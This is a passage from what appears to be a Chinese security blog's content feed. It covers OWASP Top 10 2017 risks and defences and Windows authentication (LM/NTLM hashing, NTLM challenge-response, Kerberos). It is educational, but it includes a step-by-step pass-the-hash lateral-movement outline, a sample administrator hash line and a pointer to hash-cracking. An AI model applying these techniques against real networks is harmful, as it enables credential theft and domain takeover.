API，避免完全使用解释器；</li><li>在服务器使用“白名单”规范化用户输入；</li><li>使用解释器转义语法转义特殊字符；</li><li>在查询中使用 LIMIT 和其他 SQL 控件，以防止在 SQL 注入时大量泄露记录。</li></ul><h2 id="0x02-失效的身份认证"><a href="#0x02-失效的身份认证" class="headerlink" title="0x02 失效的身份认证"></a>0x02 失效的身份认证</h2><p>通过不正确地使用应用程序的身份认证和会话管理功能，导致攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p><p><strong>威胁来源</strong></p><p>攻击者可以获得数百万的有效用户名和密码组合，包括大量溢出的凭据、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的 GPU 破解工具，攻击者也可以结合社会工程学，发现失效的身份验证并利用。</p><p><strong>影响</strong></p><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈、用户身份盗窃、泄露法律高度保护的敏感信息等。</p><p><strong>防范</strong></p><ul><li>在可能的情况下，实现多因素身份验证 ；</li><li>不要使用默认的凭证，特别是管理员用户；</li><li>执行弱密码检测，使密码长度、复杂性符合安全策略；</li><li>限制或逐渐延迟失败的登录尝试，记录所有失败信息；</li><li>使用服务器端内置的会话管理器，在登录后生成高度复杂的新随机会话 ID，会话 ID 不能在 URL 中；</li><li>当用户不活跃时，及时使用户会话或认证令牌失效。</li></ul><h2 id="0x03-敏感数据泄漏"><a href="#0x03-敏感数据泄漏" class="headerlink" title="0x03 敏感数据泄漏"></a>0x03 敏感数据泄漏</h2><p>许多 Web 应用程序和 API 都无法正确保护敏感数据，为抵御攻击者我们需要对敏感数据加密，这些数据包括传输过程中的数据、存储的数据以及浏览器交互过程中的数据。</p><p><strong>威胁来源</strong></p><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（如浏览器）窃取密钥，发起中间人攻击，或从服务器端窃取明文数据。最常见的漏洞是对敏感信息不进行加密，或者在数据加密过程中使用不安全的密钥生成和管理机制，以及使用弱加密算法、弱协议和弱密码。</p><p><strong>影响</strong></p><p>敏感数据泄漏，通常包括很多个人敏感信息（PII），如：医疗记录、认证凭证、个人隐私、信用卡信息等，攻击者可以通过窃取或修改未加密的数据实施信用卡诈骗、身份盗窃或其他犯罪行为。</p><p><strong>防范</strong></p><p>对一些需要加密的敏感数据，至少应该做到以下几点：</p><ul><li>对系统处理、存储或传输的数据进行分类，并根据分类进行访问控制；</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据；</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除；</li><li>确保存储的所有敏感数据被加密；</li><li>确保传输过程中的数据被加密，如使用 HSTS（使用HTTP严格安全传输协议）；</li><li>确保使用了专用的算法存储密码，如使用 scrypt、bcrypt 或者 PBKDF2；</li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且保证密钥管理安全；</li><li>禁止缓存对包含敏感数据的响应；</li><li>单独验证每个安全配置项的有效性。</li></ul><h2 id="0x04-XML-外部实体"><a href="#0x04-XML-外部实体" class="headerlink" title="0x04 XML 外部实体"></a>0x04 XML 外部实体</h2><p>许多较早的或配置错误的 XML 处理器使用了 XML 文件中的外部实体引用，攻击者可以利用外部实体窃取使用 URI 文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p><p><strong>威胁来源</strong></p><p>大量 XXE 缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的 XXE 缺陷、深嵌套的依赖项或集成，如果攻击者可以上传 XML 文档或者在 XML 文档中添加恶意内容，他们就能够攻击含有缺陷的 XML 处理器。</p><p><strong>影响</strong></p><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站、发起拒绝服务攻击等危害。</p><p><strong>防范</strong></p><p>对开发人员进行安全培训是识别和减少 XXE 缺陷的关键，此外，防止 XXE 缺陷还需要： </p><ul><li>尽可能使用简单的数据格式（如 JSON），避免对敏感数据进行序列化；</li><li>及时修复或更新应用程序和底层操作系统使用的所有 XML 处理器和库；</li><li>在应用程序的所有 XML 解析器中禁用 XML 外部实体和 DTD 进程；</li><li>在服务端使用“白名单”对输入进行验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据；</li><li>验证 XML 或 XSL 文件上传功能是否使用 XSD 或其他方法来验证上传的 XML 文件；</li><li>使用 SAST 工具检测源代码中的 XXE 漏洞；</li><li>使用虚拟修复程序、API 安全网关或 WAF 来检测、监控和防止 XXE 攻击。</li></ul><h2 id="0x05-失效的访问控制"><a href="#0x05-失效的访问控制" class="headerlink" title="0x05 失效的访问控制"></a>0x05 失效的访问控制</h2><p>由于未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p><strong>威胁来源</strong></p><p>对访问控制的利用是渗透测试人员的一项核心技能，使用 SAST（静态应用程序安全性测试） 工具和 DAST（动态应用程序安全性测试）工具可以检测到访问控制的缺失，但不能验证其功能是否正常。</p><p><strong>影响</strong></p><p>攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。</p><p><strong>防范</strong></p><p>访问控制只有在受信服务端代码或没有服务器的 API 中有效， 这样攻击者才无法修改访问控制检查或元数据。</p><ul><li>除公有资源外，其他资源默认情况下拒绝访问；</li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化 CORS 使用；</li><li>禁用 Web 服务器目录列表，并确保文件元数据不存在于 Web 的根目录中；</li><li>记录失败的访问请求，并在适当时向管理员告警；</li><li>对 API 和服务器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害；</li><li>当用户注销后，服务器上的 JWT（JSON Web Token）令牌应失效。</li></ul><h2 id="0x06-安全配置错误"><a href="#0x06-安全配置错误" class="headerlink" title="0x06 安全配置错误"></a>0x06 安全配置错误</h2><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 头部配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><p><strong>威胁来源</strong></p><p>安全配置错误可以发生在一个应用程序的任何层面，包括网络服务、平台、Web 服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储等。通常，攻击者能够通过未修复的漏洞、默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权访问或了解。</p><p><strong>影响</strong></p><p>这些漏洞使攻击者能访问一些未授权的系统数据或功能，严重的时候可能会导致系统被完全攻破。 </p><p><strong>防范</strong></p><p>应实施安全的应用部署过程，包括： </p><ul><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例，移除或不安装不适用的功能和框架；</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，特别注意云存储权限；</li><li>使用能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组；</li><li>使用 HTTP 安全头部向客户端发送指令；</li><li>在所有环境中能够进行正确并自动化的安全配置。</li></ul><h2 id="0x07-XSS-跨站脚本"><a href="#0x07-XSS-跨站脚本" class="headerlink" title="0x07 XSS 跨站脚本"></a>0x07 XSS 跨站脚本</h2><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML 或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本、劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p><strong>威胁来源</strong></p><p>XSS 是 OWASP Top10 中第二普遍的安全问题，存在于近三分之二的应用中，自动化工具能够检测并利用所有三种形式的 XSS ，并且存在方便攻击者利用漏洞的框架。 </p><p><strong>影响</strong></p><p>反射型 XSS 和 DOM 型 XSS 的影响是中等的，而存储型 XSS 的影响更为严重，如可以在受害者的浏览器上执行远程代码、窃取凭证和会话记录或传递恶意软件等。</p><p><strong>防范</strong></p><p>防止 XSS 需要将不可信数据与动态的浏览器内容区分开：</p><ul><li>使用从设计上就会自动编码来解决 XSS 问题的框架，如 Ruby 3.0 或 React JS；</li><li>为了避免反射式或存储式的 XSS 漏洞，最好的办法是根据 HTML 输出的上下文对所有不可信的 HTTP 请求数据进行恰当的转义；</li><li>在客户端修改浏览器文档时，为了避免 DOM XSS 攻击，最好的选择是实施上下文敏感数据编码；</li><li>对抗 XSS 的深度防御策略是使用 CSP 内容安全策略。</li></ul><h2 id="0x08-不安全的反序列化"><a href="#0x08-不安全的反序列化" class="headerlink" title="0x08 不安全的反序列化"></a>0x08 不安全的反序列化</h2><p>不安全的反序列化会导致远程代码执行，即使有些反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行重放攻击、注入攻击和特权升级攻击等。</p><p><strong>威胁来源</strong></p><p>对反序列化的利用比较困难，因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。有些工具可以被用于发现反序列化缺陷，但仍需要人工帮助来验证发现的问题。</p><p><strong>影响</strong></p><p>反序列化缺陷的影响不能被低估，它可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><p><strong>防范</strong></p><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体，其次可以：</p><ul><li>执行完整性检查，如对任何序列化对象进行数字签名，以防止恶意用户创建或篡改数据；</li><li>在创建对象之前强制执行严格的类型约束，但是绕过这种技术的方法已经被证明，完全依赖于它并不可取；</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码；</li><li>记录反序列化的例外情况和失败信息，如传入的类型不是预期的类型，或者反序列处理引发的例外情况；</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连接；</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h2 id="0x09-使用含有已知漏洞的组件"><a href="#0x09-使用含有已知漏洞的组件" class="headerlink" title="0x09 使用含有已知漏洞的组件"></a>0x09 使用含有已知漏洞的组件</h2><p>如果应用程序中含有已知漏洞的组件，则有可能被攻击者利用，会造成严重的数据丢失或服务器接管。</p><p><strong>威胁来源</strong></p><p>很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题，这些缺陷可能是偶然的，比如编码错误，也可能是蓄意的，比如软件后门。对一些漏洞而言很容易找到其利用程序，对于某些漏洞则需要定制开发。</p><p><strong>影响</strong></p><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞，根据你所要保护的资产，此类风险等级可能会很高。</p><p><strong>防范</strong></p><p>应该制定一个补丁管理流程：</p><ul><li>移除不使用的依赖、不需要的功能、组件、文件和文档；</li><li>利用工具持续记录客户端和服务端所依赖库的版本信息，订阅关于所使用组件安全漏洞的警告邮件，并监控如 CVE 和 NVD 等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能；</li><li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险；</li><li>监控那些不再维护或者不发布安全补丁的库和组件；</li><li>如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。 </li><li>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。</li></ul><h2 id="0x10-不足的日志记录和监控"><a href="#0x10-不足的日志记录和监控" class="headerlink" title="0x10 不足的日志记录和监控"></a>0x10 不足的日志记录和监控</h2><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间在 200 天之后，且通常是外部检测方检测到的，而不是通过内部流程或监控检测。</p><p><strong>威胁来源</strong></p><p>对不足的日志记录和监控的利用几乎是每一个重大安全事件的温床，攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><p><strong>影响</strong></p><p>多数成功的攻击往往从漏洞探测开始，允许这种探测将会大大提高攻击者攻击成功的可能性。</p><p><strong>防范</strong></p><p>根据应用程序存储或处理的数据的风险：</p><ul><li>确保所有登录、访问控制失败、输入验证失败都能被记录到日志中去，并保留足够的用户上下文信息，以识别可疑账户或恶意帐户，并为后期取证预留足够的信息；</li><li>确保日志以一种能被集中管理的形式生成； </li><li>确保高额交易有完整性控制的审计信息，以防止被篡改或删除；</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被即使发现和应对； </li><li>建立或采取一个应急响应机制和恢复计划。</li></ul><p><strong>参考文章：</strong><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf">OWASP Top 10 2017.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OWASP</tag>
      
      <tag>Web安全</tag>
      
      <tag>SQL</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集思路</title>
    <link href="/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
    <url>/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>常见的内网信息搜集目标和信息搜集思路，如下图所示：</p><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="内网信息搜集"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 安全认证机制探究</title>
    <link href="/post/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/"/>
    <url>/post/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Windows 身份认证有 NTLM 和 Kerberos 两种协议，前者主要应用于 Windows NT 和 Windows 2000 Server 及之后的工作组环境，而后者则主要应用于 Windows 2000 Server 及之后的域环境。NTLM 是 Windows 早期版本的标准安全协议，认证过程相对简单；而 Kerberos 较之 NTLM 更高效、更安全，同时认证过程也相对复杂。本文将围绕这两种协议，对 Windows 安全认证机制中涉及到的内容进行初步探究。</p><h2 id="0x01-Windows-Hash-类型"><a href="#0x01-Windows-Hash-类型" class="headerlink" title="0x01 Windows Hash 类型"></a>0x01 Windows Hash 类型</h2><p>Windows 系统使用两种方法对用户的密码进行哈希处理，它们分别是 LAN Manager 哈希（LM Hash）和 NT LAN  Manager 哈希（NTLM Hash）。</p><h3 id="LM-型哈希"><a href="#LM-型哈希" class="headerlink" title="LM 型哈希"></a>LM 型哈希</h3><p>LM Hash 是 Windows 系统所用的第一种密码哈希算法，它只有一个版本且一直用到了 NTLM 哈希的出现，在 Windows Vista 和 Windows Server 2008 以前的系统中使用。</p><p>LM 型哈希对一个密码的处理过程如下：</p><ol><li>将用户的明文口令全部转换成大写形式（用户口令被限制为最多14个字符）；</li><li>将口令转换为16进制字符串，不足14个字节要求在后面用0补全；</li><li>将新得到的用户口令从中间一分为二，每一半分别包含7个字节；</li><li>将每部分转换成56 bit 的比特流，长度不足56 bit 要求使用0在左边补齐长度，再分7 bit 为一组末尾加0，组成新的64 bit编码；</li><li>将上述得到的两组8字节编码，分别作为 DES 密钥加密字符串 **KGS!@#$%**，得到两个8字节的16进制密文；</li><li>将两组8字节的密文拼接，最终得到 LMHash 值。</li></ol><h3 id="NTLM-型哈希"><a href="#NTLM-型哈希" class="headerlink" title="NTLM 型哈希"></a>NTLM 型哈希</h3><p>NTLM 型哈希也被称为 <strong>NTHash</strong>，由于 IBM 设计的 LM Hash 算法存在几个弱点，因此在 Windows Vista 和 Windows Server 2008 及之后的 Windows 系统中 LM Hash 被弃用，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash 便应运而生。NTLM Hash 以 MD4 散列算法为基础，在实现起来实际上更为简单。</p><p>NTLM 型哈希对一个密码的处理过程如下：</p><ol><li>将密码字符串转化为 ASCII 字符串（123456 -&gt; 49 50 51 52 53 54）；</li><li>将 ASCII 字符串转换为十六进制字符串（49 50 51 52 53 54 -&gt; 31 32 33 34 35 36）； </li><li>将十六进制字符串转化为 Unicode 字符串（31 32 33 34 35 36 -&gt; 310032003300340035003600）；</li><li>对 Unicode 字符串使用 MD4 散列算法，得到16字节的 NTLM Hash 值（310032003300340035003600 -&gt; 32ed87bdb5fdc5e9cba88547376818d4）。</li></ol><p>与 LM Hash 算法相比，NTLM Hash 对明文口令大小写敏感，且无法根据 NTLM Hash 判断原始明文口令是否小于8字节，摆脱了魔术字符串 KGS!@#$%。另外相较于 DES 加密，MD4 哈希算法被认为要强壮得多，因为它允许使用更长的密码，允许有大小写的不同，而且也无须把密码分割成更小、更易于被破解的块。</p><p><strong>NTLM Hash 与 Net-NTLM Hash 的区别</strong></p><p>NTLM Hash 通常是指 Windows 系统下 Security Account Manager 中保存的用户密码 hash，Net-NTLM Hash 通常是指网络环境下用于网络身份认证（例如 NTLM 认证）中的 hash，如 Net-NTLMv1 和 Net-NTLMv2。</p><h3 id="Windows-Hash-密码格式"><a href="#Windows-Hash-密码格式" class="headerlink" title="Windows  Hash 密码格式"></a>Windows  Hash 密码格式</h3><p>格式为：<code>用户名称:RID:LMHash:NTHash</code></p><blockquote><p>例如：<br>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p><p>表示：<br>用户名称为：Administrator<br>RID 为：500<br>LM Hash 值为：C8825DB10F2590EAAAD3B435B51404EE<br>NTLM Hash 值为：683020925C5D8569C23AA724774CE6CC</p></blockquote><p>如果你知道某个用户的 NTLM Hash 密码了，可以使用 hashcat 进行破解，或者到 <a href="http://www.objectif-securite.ch/en/ophcrack.php">这个网站</a> 进行在线破解。</p><h3 id="Windows-下各类-HASH-比较"><a href="#Windows-下各类-HASH-比较" class="headerlink" title="Windows 下各类 HASH 比较"></a>Windows 下各类 HASH 比较</h3><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/20180715111518-4cceec08-87dd-1.png"></p><h2 id="0x02-Windows-域和工作组"><a href="#0x02-Windows-域和工作组" class="headerlink" title="0x02 Windows 域和工作组"></a>0x02 Windows 域和工作组</h2><p>局域网上的资源需要管理，<strong>域（Domain）</strong>和 <strong>工作组（Work Group）</strong>就是两种不同的网络资源管理模式，两者之间的基本区别在于资源的共享方式和管理用户的方法不同，主要根据 LAN 的规模来区别使用，Windows 计算机不能同时属于域与工作组。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，组中每台计算机还是单独管理的，如果要访问其中的计算机，则需要到被访问计算机上进行用户验证，这增加了访问的复杂程度。例如想要通过工作组控制用户访问共享文件，当一台计算机设定了密码后，其他计算机每次在访问这台电脑中的共享文件时都必须输入密码。</p><p>加入工作组的方法很简单，如果在 LAN 上的计算机设置了相同的工作组名称，<strong>网络</strong> 中就会将这些计算机将显示在同一个工作组中。你可以随便加入同一网络上的任何工作组，也可以随时退出某个工作组，只要将工作组名称改动即可。工作组就像一个可以自由加入和退出的俱乐部一样，它本身的作用仅仅是提供一个“房间”，以便同一 LAN 下的计算机可以共享资源。 </p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>与工作组的松散的“会员制”有所不同，域是一个相对严格的组织，是一个有 <strong>安全边界</strong> 的计算机集合。在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器时，不需要在访问的计算机上再次进行身份验证。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的计算机和用户的验证工作，相当于一个单位的门卫一样，这个服务器被称为 <strong>域控制器（Domain  Controller，DC）</strong>。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息。当计算机联入网络时，域控制器首先要鉴别这台计算机是否是属于这个域的，用户使用的账号/口令是否正确，认证成功后，再访问这个域中的共享文件时就无须每次输入密码了。</p><p>关于林根域的概念具体见这篇文章：<a href="http://angerfire.blog.51cto.com/198455/144123/">图解域域树域林根域的含义</a></p><h3 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h3><p>域用户的帐号和密码是不在本机的，全部保存在域控制器上，而工作组中帐号和密码都保存在本地。</p><p>域和工作组适用的环境不同，<strong>域一般是用在比较大的网络里</strong>，工作组则较小。</p><p>在一个域中需要有一台域控服务器，对其他计算机的互相访问进行管理；而在工作组中所有的计算机都是对等的，也就没有了服务器和客户机之分，但是和域一样，工作组中也存在一台组控服务器（以选举的方式产生，不固定），用于存储和这个组相关的信息。如果一台计算机想访问组中其他的计算机时，首先也要找到这个组中的组控服务器，得到工作组的信息，然后继续访问。</p><h2 id="0x03-NTLM-身份认证"><a href="#0x03-NTLM-身份认证" class="headerlink" title="0x03 NTLM 身份认证"></a>0x03 NTLM 身份认证</h2><p>NTLM 是 Windows NT 早期版本的标准安全协议，为用户提供认证、完整性和机密性保障，因向后兼容而被保留下来，有 NTLMv1，NTLMv2，NTLMv2 session 三种版本。</p><h3 id="NTML-认证过程"><a href="#NTML-认证过程" class="headerlink" title="NTML 认证过程"></a>NTML 认证过程</h3><p>NTLM 是一种挑战/响应（Challenge/Response）形式的验证机制，主要包括三类消息类型：</p><ul><li><p>Type1  message：协商（negotiation）</p><p>客户端在发起认证时，首先向服务器发送协商消息。协商需要认证的主体、用户、机器以及需要使用的安全服务等信息，并通知服务器自己支持的协议内容、加密等级等。</p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-eeb88612cb73ea1f.jpg"></p><ul><li><p>Type2  message：挑战（challenge）</p><p>服务器在收到客户端的协商消息之后，会读取其中的内容，从中选择出自己所能接受的服务内容，比如加密等级，安全服务等，并生成一个随机数 challenge，然后生成挑战消息返回给客户端。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-b1a7ab377044b2fb.jpg"></p><ul><li><p>Type3  message：认证（authentication）</p><p>客户端在收到服务器返回的 challenge 消息后，读取服务器所支持的内容和随机数 challenge，决定服务器所支持的内容是否满足自己的要求。如果满足，则使用自己的 password hash 加密 challenge， 并最终生成一个认证消息发送给服务器。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-114b90a7b8f7eb32.jpg"></p><p>下面来详细解析 NTLM 验证过程，一共分为七步：</p><ol><li>用户访问客户端计算机并提供域名（domain name）、用户名（user name）和口令（password）。在客户端计算口令的Hash值并保存在本地；</li><li>客户端（Client）将用户名发送给服务器（以明文形式）；</li><li> 服务器（Server）生成一个16字节的随机数，称为challenge或nonce，并将其发送给客户端；</li><li>客户端收到challenge后，复制一份拷贝，然后将其中一个challenge使用用户口令的单向散列（password hash）加密，之后作为response发送给服务器。这叫做响应。</li><li>服务器在收到客户端传送过来response后，将user name，challenge以及response这三份内容发送给域控制器DC。</li><li>DC在收到user name，challenge，response后，根据user name在SAM数据库（Security Account Manager database）中找到其对应的password hash，然后用这个password hash加密challenge，得到challenge-hash；</li><li>DC将它计算出的challenge-hash（步骤6）与客户端计算出的response（步骤4）进行比较。如果他们相同，则验证成功。之后DC会将验证结果发给Server，并最终返回给Client。（如果是使用本地用户身份进行认证，则由Server本身完成认证过程。）</li></ol><blockquote><p>注：在 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">Microsoft NTLM</a> 中提到让我们不要直接使用 NTLM，而是使用 negotiate。由于 Kerberos 的安全性要比 NTLM 更高，在 negotiate 情况下 Windows 会判断 Kerberos 是否可用，如果可用就优先使用 Kerberos，否则才会使用 NTLM。</p></blockquote><h3 id="SSPI-amp-SSP"><a href="#SSPI-amp-SSP" class="headerlink" title="SSPI &amp; SSP"></a>SSPI &amp; SSP</h3><p><strong>SSPI（Security Support Provider Interface ）</strong>是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数；<strong>SSP（Security Support Provider）</strong>是 SSPI 的实现者，用于提供安全功能，比如 <strong>NTLMSSP（NTLM Security Support Provider）</strong>就为 NTLM 认证的实现提供了基本功能，类似的还有 Negotiate、Kerberos、CredSSP、DigestSSP、NegotiateSSP 等。</p><blockquote><p>注：由于 NTLMSSP 只是实现了 NTLM 认证，它并没有规定使用什么协议来进行传输。实际上 SMB、HTTP、LDAP、MSSQL 等协议都可以携带 NTLM 认证的三类消息，也就是说我们可以通过这些协议来进行攻击。</p></blockquote><h3 id="NTLM-Relay-amp-PTH"><a href="#NTLM-Relay-amp-PTH" class="headerlink" title="NTLM-Relay &amp; PTH"></a>NTLM-Relay &amp; PTH</h3><p>NTLM-Relay 和 <strong>Pass the Hash（PTH）</strong>在某些部分有些相似，但实际上是完全不同的两个东西。NTLM-Relay 针对的是用于网络认证的 Net-NTLM Hash，而 LMHash 或者 NTHash 从严格意义上讲，可以用来进行 pass the hash attack，但并不能进行 relay attack。</p><blockquote><p>通常我们使用 Responder 等工具获取到的就是 Net-NTLM Hash，这类 hash 并不能直接用来 PTH，但可以通过暴力破解来获取明文密码。</p></blockquote><p>Pass the Hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过传递 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果内网主机的本地管理员账户密码相同，即可通过 Pass the Hash 远程登录到任意一台主机。</p><p>利用 Pass the Hash 的渗透方式如下：</p><ol><li>获取某一台域主机管理员权限；</li><li>Dump（抓取）内存获取用户 hash；</li><li>通过 Pass the Hash 尝试登录其他主机；</li><li>继续搜集 hash 并尝试远程登录；</li><li>直到获得域管理员账户 hash，登录域控，最终成功控制整个域。</li></ol><p>这类攻击适用于：</p><ul><li>域/工作组环境</li><li>可以获得 hash，但条件不允许对 hash 进行爆破</li><li>内网中存在和当前机器相同的密码</li></ul><h3 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h3><p>随着大家对 Pass the Hash 的认识越来越高，防御方法也越来越多，微软在2014年发布了更新补丁 kb2871997 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 WMI、psexec、schtasks、at 和访问文件共享。同样，禁用 NTLM 也使得 psexec 无法利用获得的 NTLM Hash 进行远程连接。</p><blockquote><p>然而，安全研究人员在测试中发现，打了补丁之后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator（SID 500）账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接（2014）。</p><p>所以对于防御方来说，即使打了补丁也要记得禁用 SID=500 的管理员账户。</p></blockquote><p>由于 <strong>mimikatz</strong> 的出现， 再次改变了格局。国外安全研究人员开发的 mimikatz 实现了在禁用 NTLM 的环境下仍然可以远程连接，并且可以通过用户账户的 aes Key 进行远程连接，即利用 <strong>Pass the Key（PTK）</strong>。</p><h2 id="0x04-Kerberos-身份认证"><a href="#0x04-Kerberos-身份认证" class="headerlink" title="0x04 Kerberos 身份认证"></a>0x04 Kerberos 身份认证</h2><p>Kerberos 一词来源于希腊神话，是一种基于 <strong>票据（Ticket）</strong>的认证方式，其中三个主体分别是客户端、服务器和第三方认证服务器 KDC。客户端用户在访问服务器前，需要先从第三方认证服务器 KDC 处获取许可证，只有通过合法性认证的用户，才能依据票据去访问所需的服务和应用。</p><blockquote><p>在 Windows 域环境中，KDC 的角色由 DC（Domain Controller）来担当。</p></blockquote><h3 id="Kerberos-认证过程"><a href="#Kerberos-认证过程" class="headerlink" title="Kerberos 认证过程"></a>Kerberos 认证过程</h3><p>一次完整的 Kerberos 身份认证流程，如图所示：</p><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/kerberos.png"></p><p>1）账号 A 和 KDC 互相认证</p><p>账号 A 利用 hash 函数把密码转化成一把密钥，我们称它为 Kclt，用 Kclt 加密当前时间戳，生成一个字符串 {时间戳}Kclt。把上一步生成的字符串 {时间戳}Kclt、账号 A 的信息，以及一段随机字符串发给 KDC。这样就组成了 Kerberos 的身份认证请求 <strong>AS_REQ</strong>。</p><p>KDC 收到 AS_REQ 之后，先读到账号 A 的信息，于是便调出 A 的密码，再用同样的 hash 函数转化为 <strong>Kclt</strong>。有了 Kclt 就可以解开{时间戳}Kclt，如果能成功解开，则说明该请求是由账号 A 生成的，即完成对账号 A 的身份认证。</p><p>接下来轮到 KDC 向账号 A 证明自己的身份，KDC 使用 Kclt 加密随机字符串，回复给账号 A，如果账户 A 拿到回复后能够解出随机字符串，则说明 KDC 为真。</p><p>同时，KDC 生成两把一样的密钥 <strong>Kclt-Kdc</strong>，用于以后账户 A 和 KDC 之间互相认证，这样就省去了每次都要调出账号 A 的密码和 hash 等工作。其中一把密钥发给账户 A 